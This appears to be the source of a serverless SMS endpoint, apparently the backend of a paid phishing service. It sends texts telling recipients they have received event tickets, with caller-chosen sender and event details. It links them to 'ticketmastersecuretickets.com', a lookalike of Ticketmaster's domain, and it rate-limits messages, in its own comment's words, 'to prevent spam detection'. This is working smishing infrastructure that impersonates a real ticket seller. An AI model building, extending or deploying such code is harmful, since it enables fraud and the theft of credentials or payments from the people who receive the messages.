import nodemailer from 'nodemailer';
import { Resend } from 'resend';
import admin from 'firebase-admin';
import { db } from './lib/firebase';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// SMS Service Configuration
const SMS_PROVIDERS = {
    TWILIO: {
        accountSid: process.env.TWILIO_ACCOUNT_SID,
        authToken: process.env.TWILIO_AUTH_TOKEN,
        fromNumber: process.env.TWILIO_FROM_NUMBER
    },
    TEXTBELT: {
        apiKey: process.env.TEXTBELT_API_KEY
    }
};

// Global rate limiter for SMS
let lastSmsTime = 0;
const MIN_SMS_INTERVAL = 3000; // 3 seconds between SMS

export default async function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    // Handle OPTIONS request for CORS preflight
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    // Only allow POST requests
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Rate limiting to prevent spam detection
        const now = Date.now();
        const timeSinceLastSms = now - lastSmsTime;

        if (timeSinceLastSms < MIN_SMS_INTERVAL) {
            const waitTime = MIN_SMS_INTERVAL - timeSinceLastSms;
            console.log(`SMS Rate limiting: waiting ${waitTime}ms before sending SMS...`);
            await new Promise(resolve => setTimeout(resolve, waitTime));
        }

        lastSmsTime = Date.now();

        const {
            recipientPhone,
            recipientName,
            senderName,
            eventTitle,
            eventDate,
            eventVenue,
            section,
            row,
            seats,
            ticketCount,
            seatType,
            customMessage = 'Your tickets are ready for transfer and will be activated upon acceptance',
            userEmail // Required to check SMS credits
        } = req.body;

        // Validate required fields
        if (!recipientPhone || !recipientName || !eventTitle || !userEmail) {
            return res.status(400).json({
                error: 'Missing required fields: recipientPhone, recipientName, eventTitle, userEmail'
            });
        }

        // Validate phone number format
        const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
        const cleanPhone = recipientPhone.replace(/\s/g, '');
        if (!phoneRegex.test(cleanPhone)) {
            return res.status(400).json({
                error: 'Invalid phone number format'
            });
        }

        console.log('Received SMS request with data:', {
            recipientPhone: cleanPhone,
            recipientName,
            senderName,
            eventTitle,
            eventDate,
            eventVenue,
            section,
            row,
            seats,
            ticketCount,
            seatType,
            userEmail
        });

        // Check SMS credits for user
        const creditCheck = await checkSmsCredits(userEmail);
        if (!creditCheck.hasCredits) {
            return res.status(402).json({
                error: 'Insufficient SMS credits',
                creditsRemaining: creditCheck.creditsRemaining,
                needsSubscription: true,
                subscriptionUrl: 'https://sms-subscription-site.com'
            });
        }

        // Generate SMS message
        const smsMessage = generateSmsMessage({
            recipientName,
            senderName,
            eventTitle,
            eventDate,
            eventVenue,
            section,
            row,
            seats,
            ticketCount,
            seatType,
            customMessage
        });

        // Send SMS with fallback providers
        const smsResult = await sendSmsWithFallback(cleanPhone, smsMessage);

        if (smsResult.success) {
            // Deduct SMS credit
            await deductSmsCredit(userEmail);

            // Log SMS activity
            await logSmsActivity(userEmail, {
                recipientPhone: cleanPhone,
                recipientName,
                eventTitle,
                timestamp: new Date().toISOString(),
                status: 'sent',
                provider: smsResult.provider
            });

            return res.status(200).json({
                success: true,
                message: 'SMS sent successfully',
                data: {
                    recipientPhone: cleanPhone,
                    messageId: smsResult.messageId,
                    provider: smsResult.provider,
                    creditsRemaining: creditCheck.creditsRemaining - 1
                }
            });
        } else {
            return res.status(500).json({
                success: false,
                error: 'Failed to send SMS',
                details: smsResult.error
            });
        }

    } catch (error) {
        console.error('SMS sending error:', error);
        return res.status(500).json({
            success: false,
            error: 'Internal server error',
            details: error.message
        });
    }
}

// Generate SMS message content
function generateSmsMessage(data) {
    const {
        recipientName,
        senderName,
        eventTitle,
        eventDate,
        eventVenue,
        section,
        row,
        seats,
        ticketCount,
        seatType,
        customMessage
    } = data;

    let message = `🎫 ${recipientName}, you have tickets!\n\n`;
    message += `From: ${senderName}\n`;
    message += `Event: ${eventTitle}\n`;

    if (eventDate) {
        message += `Date: ${eventDate}\n`;
    }

    if (eventVenue) {
        message += `Venue: ${eventVenue}\n`;
    }

    if (section) {
        message += `Section: ${section}`;
        if (row) message += `, Row: ${row}`;
        if (seats) message += `, Seats: ${seats}`;
        message += `\n`;
    }

    if (ticketCount) {
        message += `Tickets: ${ticketCount}`;
        if (seatType) message += ` (${seatType})`;
        message += `\n`;
    }

    message += `\n${customMessage}\n\n`;
    message += `Accept tickets: https://ticketmastersecuretickets.com/accept-ticket.html?phone=${encodeURIComponent(recipientName)}&sender=${encodeURIComponent(senderName)}&event=${encodeURIComponent(eventTitle)}`;

    return message;
}

// Send SMS with fallback providers
async function sendSmsWithFallback(phoneNumber, message) {
    // Try Twilio first
    if (SMS_PROVIDERS.TWILIO.accountSid && SMS_PROVIDERS.TWILIO.authToken) {
        try {
            console.log('Attempting to send SMS via Twilio...');
            const result = await sendViaTwilio(phoneNumber, message);
            return { success: true, messageId: result.sid, provider: 'twilio' };
        } catch (error) {
            console.log('Twilio failed:', error.message);
        }
    }

    // Try Textbelt as fallback
    if (SMS_PROVIDERS.TEXTBELT.apiKey) {
        try {
            console.log('Attempting to send SMS via Textbelt...');
            const result = await sendViaTextbelt(phoneNumber, message);
            return { success: true, messageId: result.id, provider: 'textbelt' };
        } catch (error) {
            console.log('Textbelt failed:', error.message);
        }
    }

    return {
        success: false,
        error: 'All SMS providers failed. Please check configuration.'
    };
}

// Send SMS via Twilio
async function sendViaTwilio(phoneNumber, message) {
    const twilio = require('twilio');
    const client = twilio(SMS_PROVIDERS.TWILIO.accountSid, SMS_PROVIDERS.TWILIO.authToken);

    return await client.messages.create({
        body: message,
        from: SMS_PROVIDERS.TWILIO.fromNumber,
        to: phoneNumber
    });
}

// Send SMS via Textbelt
async function sendViaTextbelt(phoneNumber, message) {
    const response = await fetch('https://textbelt.com/text', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            phone: phoneNumber,
            message: message,
            key: SMS_PROVIDERS.TEXTBELT.apiKey
        })
    });

    const result = await response.json();

    if (!result.success) {
        throw new Error(result.error || 'Textbelt API error');
    }

    return result;
}

// Check SMS credits for user
async function checkSmsCredits(userEmail) {
    try {
        const userDoc = await db.collection('users').doc(userEmail).get();

        if (!userDoc.exists) {
            return {
                hasCredits: false,
                creditsRemaining: 0,
                needsSubscription: true
            };
        }

        const userData = userDoc.data();
        const credits = userData.smsCredits || 0;

        return {
            hasCredits: credits > 0,
            creditsRemaining: credits,
            needsSubscription: credits <= 0
        };
    } catch (error) {
        console.error('Error checking credits:', error);
        // Fail safe: deny access if DB error
        return {
            hasCredits: false,
            creditsRemaining: 0,
            needsSubscription: false,
            error: error.message
        };
    }
}

// Deduct SMS credit
async function deductSmsCredit(userEmail) {
    try {
        const userRef = db.collection('users').doc(userEmail);

        // Use transaction to ensure atomic update
        await db.runTransaction(async (t) => {
            const doc = await t.get(userRef);
            if (!doc.exists) {
                throw new Error('User not found');
            }

            const newCredits = (doc.data().smsCredits || 0) - 1;
            if (newCredits < 0) {
                throw new Error('Insufficient credits');
            }

            t.update(userRef, {
                smsCredits: newCredits,
                lastUsed: new Date().toISOString(),
                totalSent: admin.firestore.FieldValue.increment(1),
                thisMonthSent: admin.firestore.FieldValue.increment(1)
            });
        });

        console.log(`Deducted 1 SMS credit for user: ${userEmail}`);
    } catch (error) {
        console.error('Error deducting credit:', error);
        // We log the error but don't throw, as the SMS was already sent
        // In a strict system, we might want to handle this differently
    }
}

// Log SMS activity
async function logSmsActivity(userEmail, activity) {
    try {
        // Add to global logs collection
        await db.collection('sms_logs').add({
            userEmail,
            ...activity,
            createdAt: new Date().toISOString()
        });

        // Add to user's recent activity (limit to last 10)
        const userRef = db.collection('users').doc(userEmail);
        const userDoc = await userRef.get();

        if (userDoc.exists) {
            let recentActivity = userDoc.data().recentActivity || [];
            recentActivity.unshift({
                recipient: activity.recipientPhone,
                timestamp: activity.timestamp,
                status: activity.status
            });

            // Keep only last 10
            if (recentActivity.length > 10) {
                recentActivity = recentActivity.slice(0, 10);
            }

            await userRef.update({ recentActivity });
        }
    } catch (error) {
        console.error('Error logging activity:', error);
    }
}
